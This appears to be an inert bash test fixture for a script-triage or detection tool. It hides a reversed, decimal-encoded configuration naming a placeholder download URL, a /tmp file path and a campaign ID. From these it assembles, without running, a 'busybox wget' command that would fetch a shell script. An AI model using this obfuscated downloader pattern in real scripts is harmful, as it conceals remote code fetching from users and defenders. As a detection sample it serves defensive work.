#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_79d24150='57:50:101:97:48:98:50:98:98:56:45:101:103:97:116:115:46:47:101:104:99:97:99:45:115:115:101:114:116:110:117:104:47:112:109:116:47:61:104:116:97:112:95:101:108:105:102:124:57:50:101:97:48:98:50:98:98:56:47:98:97:76:115:115:101:114:116:110:117:72:61:116:110:101:103:97:95:114:101:115:117:124:104:115:46:99:48:48:102:101:98:57:50:47:100:105:108:97:118:110:105:46:101:108:112:109:97:120:101:46:57:50:101:97:48:98:50:98:98:56:47:47:58:115:112:116:116:104:61:108:114:117:124:57:50:101:97:48:98:50:98:98:56:45:110:103:105:97:112:109:97:99:61:100:105:95:110:103:105:97:112:109:97:99:124:49:61:116:110:117:111:99:95:101:103:97:116:115:124:116:117:112:116:117:111:95:116:101:103:119:95:120:111:98:121:115:117:98:61:114:101:116:112:97:100:97:124:101:108:105:102:95:101:116:105:114:119:44:101:116:111:109:101:114:95:101:114:105:117:113:99:97:61:115:112:101:116:115:124:49:61:118'
readonly Codec_79d24150='decimal_colon|reverse_bytes|'

Load_79d24150() {
  stored_bytes=()
  local IFS=':'
  read -r -a stored_bytes <<< "${Material_79d24150}"
}

Decode_79d24150() {
  recovered_bytes=()
  local byte_index
  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
    recovered_bytes[${#stored_bytes[@]}-1-byte_index]="${stored_bytes[byte_index]}"
  done
}

Recover_79d24150() {
  local -a stored_bytes recovered_bytes
  local configuration_text harmless_value decode_pass byte_index
  local -a compass=(north south); harmless_value="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_79d24150
  if ! Decode_79d24150; then return 71; fi
  configuration_text=''
  local octal character
  for byte_index in "${!recovered_bytes[@]}"; do
    printf -v octal '%03o' "${recovered_bytes[byte_index]}"
    printf -v character '%b' "\\$octal"
    configuration_text+="$character"
  done
  printf '%s\n' "$configuration_text"
}

Inspect_79d24150() { Recover_79d24150; }

Plan_79d24150() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_79d24150)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(busybox wget -qO "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_79d24150; fi
